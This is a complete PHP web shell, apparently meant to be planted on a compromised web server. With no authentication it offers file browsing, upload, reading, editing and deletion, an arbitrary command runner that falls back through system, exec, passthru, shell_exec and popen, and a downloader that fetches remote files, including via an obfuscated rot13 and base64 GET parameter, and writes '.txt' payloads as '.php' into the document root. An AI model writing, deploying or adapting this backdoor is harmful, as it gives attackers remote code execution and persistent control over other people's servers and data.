
<?php
error_reporting(0);
$is_refresh = false;

if (empty($_POST) && empty($_FILES)) {
    setcookie('path', '', time() + 3600);
    $is_refresh = true;
}

if (isset($_POST['path'])) {
    $path = $_POST['path'];
    setcookie('path', $path, time() + 3600);
} elseif (!$is_refresh && isset($_COOKIE["path"])) {
    $path = $_COOKIE["path"];
} else {
    $path = getcwd();
}

echo '<html>
<script>
function g(method, path, name) {
    var form = document.createElement("form");
    form.setAttribute("method", "post");
    form.setAttribute("action", "");
    
    var inputMethod = document.createElement("input");
    inputMethod.setAttribute("type", "hidden");
    inputMethod.setAttribute("name", method);
    inputMethod.setAttribute("value", path);
    form.appendChild(inputMethod);

    var inputName = document.createElement("input");
    inputName.setAttribute("type", "hidden");
    inputName.setAttribute("name", "name");
    inputName.setAttribute("value", name);
    form.appendChild(inputName);

    document.body.appendChild(form);
    form.submit();
}
</script>
<style type="text/css">
a:link {
    color: #0000E3;
}
a:visited {
    color: #0000E3;
}
</style>
';
echo '<body>
<form method="post" action="" id="form">
    <input type="hidden" name="type" value="">
    <input type="hidden" name="path" value="">
</form>
<table width="380" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>Current Path : ';

$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);
foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        $a = true;
        echo '<a href="#" onclick="g(\'path\',\'/\',\'\');">/</a>';
        continue;
    }
    if ($pat == '') continue;
    echo '<a href="#" onclick="g(\'path\',\'';
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) echo "/";
    }
    echo '\',\'\');">' . $pat . '</a>/';
}
echo '</td></tr><tr><td>';

if (isset($_FILES['getupload'])) {
    $target_path = basename($_FILES["getupload"]["name"]);
    if (move_uploaded_file($_FILES["getupload"]["tmp_name"], $path . '/' . $target_path)) {
        echo '<font color="green">file uploaded</font><br />';
    } else {
        echo '<font color="red">upload fail</font><br />';
    }
}

echo "<form enctype=\"multipart/form-data\" method=\"post\" action=\"\"><input name=\"getupload\" type=\"file\"/><input type=\"submit\" value=\"Upload File\"/></form></td></tr>";

function get($url, $dir)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $data = curl_exec($ch);
    if (!$data) {
        $data = @file_get_contents($url);
    }
    file_put_contents($dir, $data);
}

function run($command)
{
    $command .= ' 2>&1';
    $result = '';
    if (function_exists('system')) {
        ob_start();
        @system($command);
        $result = ob_get_clean();
    } elseif (function_exists('exec')) {
        @exec($command, $result);
        $result = @join("\n", $result);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($command);
        $result = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $result = shell_exec($command);
    } elseif (is_resource($f = @popen($command, "r"))) {
        $result = "";
        while (!@feof($f))
            $result .= fread($f, 1024);
        pclose($f);
    }
    $type = mb_detect_encoding($result, array("ASCII", 'UTF-8', "GB2312", "GBK", 'BIG5', 'LATIN1'));
    if ($type != 'UTF-8') {
        $result = mb_convert_encoding($result, 'UTF-8', $type);
    }
    return $result;
}

if (isset($_GET['dw'])) {
    $dw = $_GET['dw'];
    $dw = base64_decode(str_rot13($dw));
    if (preg_match('/url=(.*?)&dir=(.*)/', $dw, $info)) {
        $url = $info[1];
        $dir = $info[2];
    } else {
        preg_match('/url=(.*)/', $dw, $info);
        $url = $info[1];
        $dir = '';
    }

    preg_match('/(.*)\/(.*)\.(.*?)$/', $url, $n);
    if ($n[3] == 'txt') {
        $z = 'php';
        $name = $n[2];
    } else {
        $z = $n[3];
        $name = "template";
    }

    if ($dir != '') {
        $dir = $_SERVER["DOCUMENT_ROOT"] . '/' . $dir . '/' . $name . '.' . $z;
    } else {
        $dir = $_SERVER["DOCUMENT_ROOT"] . '/' . $name . '.' . $z;
    }

    get($url, $dir);

    if (file_exists($dir)) {
        echo "<tr><td><font color=\"green\">download success</font></td></tr>";
    } else {
        echo "<tr><td><font color=\"red\">download fail</font></td></tr>";
    }
} elseif (isset($_POST['get_url'])) {
    $url = $_POST['get_url'];
    preg_match('/(.*)\/(.*)\.(.*?)$/', $url, $n);
    if ($n[3] == 'txt') {
        $z = 'php';
        $name = $n[2];
    } else {
        $z = $n[3];
        $name = "template";
    }

    $dir = $_POST['dpath'] . "/" . $name . '.' . $z;
    get($url, $dir);

    if (file_exists($dir)) {
        echo "<tr><td><font color=\"green\">download success</font></td></tr>";
    } else {
        echo "<tr><td><font color=\"red\">download fail</font></td></tr>";
    }
}

echo "<tr><td><form method=\"post\" action=\"\"><span>Url: </span><input type=text name=\"get_url\" value=\"\"><input type=\"hidden\" name=\"dpath\" value=\"$path\"><input type=submit value=\"GetFile\"></form></td></tr>";

if (isset($_POST['filesrc'])) {
    $fileName = htmlspecialchars($_POST['filesrc']);
    echo "<tr><td>Current File : $fileName";
    echo '</tr></td></table><br />';
    $fileContent = @file_get_contents($fileName);
    echo '<center><pre>' . htmlspecialchars($fileContent) . '</center></pre>';
} elseif (isset($_GET['check']) &&  $_GET['check'] == '1') {
    $RootDir = $_SERVER['DOCUMENT_ROOT'];
    $filename = $RootDir . '/index.php';
    echo "<tr><td>Current File : ";
    echo $filename;
    echo '</tr></td></table><br />';
    echo '<pre>' . htmlspecialchars(@file_get_contents($filename)) . '</pre>';
} elseif (isset($_GET['run'])) {
    echo "<tr><td><form method=\"post\" action=\"\"><span>command: </span><input type=text name=\"run\" value=\"\"><input type=submit value=\"run\"></form></td></tr>";
    if ($_POST['run']) {
        $run = $_POST['run'];
        echo '<tr><td><textarea rows="12" cols="40">' . htmlspecialchars(run($run)) . '</textarea></td></tr></table>';
    } elseif ($_GET['run'] != '') {
        $run = $_GET['run'];
        echo '<tr><td><textarea rows="12" cols="40">' . htmlspecialchars(run($run)) . '</textarea></td></tr></table>';
    }

} elseif (isset($_POST['edit_file'])) {
    $editFilePath = $_POST['edit_path'] . '/' . $_POST['edit_file'];
    if (is_file($editFilePath) && is_readable($editFilePath) && is_writable($editFilePath)) {
        if (isset($_POST['edited_content'])) {
            $editedContent = $_POST['edited_content'];
            if (@file_put_contents($editFilePath, $editedContent) !== false) {
                echo '<tr><td><font color="green">File saved successfully.</font></td></tr>';
            } else {
                echo '<tr><td><font color="red">Error saving file.</font></td></tr>';
            }
        } else {
            $fileContent = @file_get_contents($editFilePath);
            echo '<tr><td>Editing File: ' . htmlspecialchars($editFilePath) . '</td></tr>';
            echo '<tr><td><form method="post" action="">
                        <textarea name="edited_content" rows="10" cols="50">' . htmlspecialchars($fileContent) . '</textarea><br/>
                        <input type="hidden" name="edit_path" value="' . htmlspecialchars($_POST['edit_path']) . '">
                        <input type="hidden" name="edit_file" value="' . htmlspecialchars($_POST['edit_file']) . '">
                        <input type="submit" value="Save Changes">
                        </form></td></tr>';
        }
    } else {
        echo '<tr><td><font color="red">Unable to edit the selected file.</font></td></tr>';
    }

} else {
    echo '</table><br /><center>';
    if (isset($_POST['delfile'])) {
        if (unlink($_POST['delfile'])) {
            echo '<font color="green">Delete File Done.</font><br />';
        } else {
            echo '<font color="red">Delete File Error.</font><br />';
        }
    }

    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="380" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"><td>Name</td><td>Size</td><td>Options</td></tr>';
    foreach ($scandir as $dir) {
        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo '<tr>
            <td><a href="#" onclick="g(\'path\',\'' . $path . '/' . $dir . '\',\'\');">' . $dir . '</a></td>
            <td>DIR</td>
            <td></td>
        </tr>';
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach ($scandir as $file) {
        if (!is_file("$path/$file")) continue;
        $size = filesize("$path/$file") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }
        echo "<tr>
            <td>
                <a href=\"#\" onclick=\"g('filesrc','$path/$file','');\">$file</a>
            </td>
            <td>" . $size . "</td>
            <td><a href=\"#\" onclick=\"g('delfile','$path/$file','');\">Delete</a></td>
            <td><a href=\"#\" onclick=\"g('edit_file','$path/$file','');\">Edit</a></td>
        </tr>";
    }
    echo '</table></div></html>';
}
?>
